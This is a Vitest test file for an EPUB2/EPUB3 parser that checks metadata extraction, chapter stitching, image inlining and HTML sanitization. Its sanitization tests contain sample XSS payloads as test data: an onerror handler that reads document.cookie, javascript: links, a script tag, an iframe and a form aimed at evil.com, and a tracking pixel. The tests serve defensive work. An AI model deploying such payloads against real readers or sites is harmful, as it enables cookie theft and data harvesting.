import { describe, it, expect } from 'vitest';
import { zipSync, strToU8 } from 'fflate';
import { parseEpubArchive } from './epub.js';

describe('Gutenberg EPUB3 Parser & Document Stitcher (parseEpubArchive)', () => {
  it('throws an error if container.xml is missing', () => {
    const invalidZip = zipSync({
      'somefile.txt': strToU8('hello world')
    });

    expect(() => parseEpubArchive(invalidZip.buffer)).toThrowError(/missing META-INF\/container.xml/);
  });

  it('throws an error if OPF package document is missing', () => {
    const invalidContainerZip = zipSync({
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="EPUB/package.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `)
    });

    expect(() => parseEpubArchive(invalidContainerZip.buffer)).toThrowError(/Missing OPF package document/);
  });

  it('correctly unpacks, extracts metadata, inlines images, and stitches EPUB3 spine chapters', () => {
    // 1. Create dummy image bytes
    const sampleImageBytes = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13]); // PNG header bytes

    // 2. Build full synthetic EPUB3 zip archive
    const epubZip = zipSync({
      mimetype: strToU8('application/epub+zip'),
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="EPUB/package.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `),
      'EPUB/package.opf': strToU8(`
        <package version="3.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>Moby Dick; Or, The Whale</dc:title>
            <dc:creator>Herman Melville</dc:creator>
          </metadata>
          <manifest>
            <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav" />
            <item id="ch1" href="text/ch01.xhtml" media-type="application/xhtml+xml" />
            <item id="ch2" href="text/ch02.xhtml" media-type="application/xhtml+xml" />
            <item id="img1" href="images/whale.png" media-type="image/png" />
            <item id="cover" href="images/cover.jpg" media-type="image/jpeg" properties="cover-image" />
          </manifest>
          <spine>
            <itemref idref="ch1" />
            <itemref idref="ch2" />
          </spine>
        </package>
      `),
      'EPUB/nav.xhtml': strToU8(`
        <html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
          <body>
            <nav epub:type="toc">
              <ol>
                <li><a href="text/ch01.xhtml#c1_heading">Chapter 1: Loomings</a></li>
                <li><a href="text/ch02.xhtml">Chapter 2: The Carpet-Bag</a></li>
              </ol>
            </nav>
          </body>
        </html>
      `),
      'EPUB/text/ch01.xhtml': strToU8(`
        <!DOCTYPE html>
        <html xmlns="http://www.w3.org/1999/xhtml">
          <head><title>Chapter 1</title><style>body { color: red; }</style></head>
          <body>
            <h2 id="heading">Chapter 1</h2>
            <p>Call me Ishmael.</p>
            <img src="../images/whale.png" alt="Whale Illustration" width="400" height="300" />
            <a href="#heading">Jump to top</a>
          </body>
        </html>
      `),
      'EPUB/text/ch02.xhtml': strToU8(`
        <!DOCTYPE html>
        <html xmlns="http://www.w3.org/1999/xhtml">
          <body>
            <h2>Chapter 2</h2>
            <p>I stuffed a shirt or two into my old carpet-bag.</p>
          </body>
        </html>
      `),
      'EPUB/images/whale.png': sampleImageBytes,
      'EPUB/images/cover.jpg': sampleImageBytes
    });

    const parsed = parseEpubArchive(epubZip.buffer);

    // Metadata Verification
    expect(parsed.title).toBe('Moby Dick; Or, The Whale');
    expect(parsed.author).toBe('Herman Melville');

    // TOC Navigation Verification
    expect(parsed.chapters.length).toBe(2);
    expect(parsed.chapters[0].title).toBe('Chapter 1: Loomings');
    expect(parsed.chapters[1].title).toBe('Chapter 2: The Carpet-Bag');

    // Spine Stitching Verification
    expect(parsed.htmlContent).toContain('Call me Ishmael.');
    expect(parsed.htmlContent).toContain('I stuffed a shirt or two');
    expect(parsed.htmlContent).toContain('epub-chapter');

    // Image Inlining & Sanitization Verification
    expect(parsed.htmlContent).toContain('data:image/png;base64,');
    expect(parsed.htmlContent).not.toContain('../images/whale.png');
    expect(parsed.htmlContent).not.toContain('color: red'); // CSS stripped

    // ID Prefixing & Anchor Link Verification
    expect(parsed.htmlContent).toContain('id="c0_heading"');
    expect(parsed.htmlContent).toContain('href="#c0_heading"');
  });

  it('correctly handles EPUB2 NCX table of contents fallback', () => {
    const epub2Zip = zipSync({
      mimetype: strToU8('application/epub+zip'),
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="content.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `),
      'content.opf': strToU8(`
        <package version="2.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>Frankenstein</dc:title>
            <dc:creator>Mary Shelley</dc:creator>
          </metadata>
          <manifest>
            <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml" />
            <item id="ch1" href="chapter1.html" media-type="application/xhtml+xml" />
          </manifest>
          <spine toc="ncx">
            <itemref idref="ch1" />
          </spine>
        </package>
      `),
      'toc.ncx': strToU8(`
        <ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
          <navMap>
            <navPoint id="np-1" playOrder="1">
              <navLabel><text>Letter 1</text></navLabel>
              <content src="chapter1.html#letter1"/>
            </navPoint>
          </navMap>
        </ncx>
      `),
      'chapter1.html': strToU8(`
        <html><body><h3 id="letter1">Letter 1</h3><p>You will rejoice to hear that no disaster has accompanied the commencement...</p></body></html>
      `)
    });

    const parsed = parseEpubArchive(epub2Zip.buffer);

    expect(parsed.title).toBe('Frankenstein');
    expect(parsed.author).toBe('Mary Shelley');
    expect(parsed.chapters.length).toBe(1);
    expect(parsed.chapters[0].title).toBe('Letter 1');
    expect(parsed.htmlContent).toContain('You will rejoice to hear');
  });

  it('does not allow self-closing anchor tags to wrap following chapter paragraphs', () => {
    const epubWithSelfClosingAnchors = zipSync({
      mimetype: strToU8('application/epub+zip'),
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="package.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `),
      'package.opf': strToU8(`
        <package version="3.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>Frankenstein Letter Test</dc:title>
            <dc:creator>Mary Shelley</dc:creator>
          </metadata>
          <manifest>
            <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml" />
          </manifest>
          <spine>
            <itemref idref="ch1" />
          </spine>
        </package>
      `),
      'ch1.xhtml': strToU8(`
        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE html>
        <html xmlns="http://www.w3.org/1999/xhtml">
          <body>
            <h2>Letter 1</h2>
            <a id="letter1_start"/>
            <p id="first_paragraph">You will rejoice to hear that no disaster has accompanied the commencement of an enterprise...</p>
          </body>
        </html>
      `)
    });

    const parsed = parseEpubArchive(epubWithSelfClosingAnchors.buffer);

    // Verify parser document tree: paragraph is NOT a child of <a>
    const container = document.createElement('div');
    container.innerHTML = parsed.htmlContent;
    const p = container.querySelector('#c0_first_paragraph');
    expect(p).not.toBeNull();
    expect(p?.closest('a')).toBeNull(); // p should NOT be inside any <a> tag!
  });

  it('sanitizes inline event handlers, javascript: links, disallowed tags, and external images (SEC-001, PRI-001)', () => {
    const maliciousEpub = zipSync({
      mimetype: strToU8('application/epub+zip'),
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="package.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `),
      'package.opf': strToU8(`
        <package version="3.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>Security Test Book</dc:title>
            <dc:creator>Tester</dc:creator>
          </metadata>
          <manifest>
            <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml" />
          </manifest>
          <spine>
            <itemref idref="ch1" />
          </spine>
        </package>
      `),
      'ch1.xhtml': strToU8(`
        <html xmlns="http://www.w3.org/1999/xhtml">
          <body>
            <h2>Chapter with Potential Injections</h2>
            <img src="https://tracking-site.com/pixel.png" alt="Tracking pixel" />
            <img src="invalid-image.jpg" onerror="alert(document.cookie)" alt="Attack image" />
            <p onclick="alert('clicked')" onmouseover="alert('hover')">Clickable text</p>
            <a href="javascript:alert('xss')">Malicious Link</a>
            <a href="javascript: void(0)">Void Link</a>
            <iframe src="https://evil.com"></iframe>
            <form action="https://evil.com/harvest"><input name="leak" value="123"/></form>
            <object data="evil.swf"></object>
          </body>
        </html>
      `)
    });

    const parsed = parseEpubArchive(maliciousEpub.buffer);
    const container = document.createElement('div');
    container.innerHTML = parsed.htmlContent;

    // 1. Event handlers stripped
    expect(parsed.htmlContent).not.toContain('onerror');
    expect(parsed.htmlContent).not.toContain('onclick');
    expect(parsed.htmlContent).not.toContain('onmouseover');

    // 2. Dangerous href protocols removed
    expect(parsed.htmlContent).not.toContain('javascript:');

    // 3. Disallowed elements removed
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.querySelector('form')).toBeNull();
    expect(container.querySelector('input')).toBeNull();
    expect(container.querySelector('object')).toBeNull();

    // 4. External tracking image stripped
    expect(parsed.htmlContent).not.toContain('https://tracking-site.com/pixel.png');
  });

  it('sanitizes chapters that lack explicit body elements and prevents raw fallback (SEC-001)', () => {
    const nonBodyEpub = zipSync({
      mimetype: strToU8('application/epub+zip'),
      'META-INF/container.xml': strToU8(`
        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
          <rootfiles>
            <rootfile full-path="package.opf" media-type="application/oebps-package+xml"/>
          </rootfiles>
        </container>
      `),
      'package.opf': strToU8(`
        <package version="3.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>Non-body Test</dc:title>
            <dc:creator>Tester</dc:creator>
          </metadata>
          <manifest>
            <item id="ch1" href="ch1.xml" media-type="application/xhtml+xml" />
          </manifest>
          <spine>
            <itemref idref="ch1" />
          </spine>
        </package>
      `),
      'ch1.xml': strToU8(`
        <section xmlns="http://www.w3.org/1999/xhtml">
          <script>alert('xss')</script>
          <p onclick="alert(1)">Text in non-body root</p>
        </section>
      `)
    });

    const parsed = parseEpubArchive(nonBodyEpub.buffer);
    expect(parsed.htmlContent).not.toContain('<script>');
    expect(parsed.htmlContent).not.toContain('onclick');
    expect(parsed.htmlContent).toContain('Text in non-body root');
  });
});
